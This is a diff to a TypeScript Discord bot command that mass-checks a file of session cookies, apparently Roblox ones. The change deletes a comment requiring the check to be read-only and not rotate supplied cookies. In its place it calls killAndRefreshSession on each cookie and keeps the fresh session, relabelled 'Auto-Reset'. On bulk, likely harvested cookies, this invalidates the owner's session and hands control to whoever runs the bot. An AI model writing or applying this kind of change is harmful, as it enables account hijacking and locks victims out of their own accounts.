@@ -40,7 +40,7 @@ function extractCookies(text: string): string[] {
 
 const data = new SlashCommandBuilder()
   .setName('check')
-  .setDescription('Mass Checking File')
+  .setDescription('Mass Checking File (Auto‑Reset)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
   ) as SlashCommandBuilder;
@@ -107,9 +107,11 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       const userId = String(validation.userId!);
       const username = validation.username!;
 
-      // Checking account information must be read-only. Do not invalidate or
-      // rotate the supplied cookie as part of a bulk check.
-      const workingCookie = rawCookie;
+      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
+      let workingCookie = rawCookie;
+      if (resetResult.success && resetResult.newCookie) {
+        workingCookie = resetResult.newCookie;
+      }
 
       const [
         ageData, ageGroup,
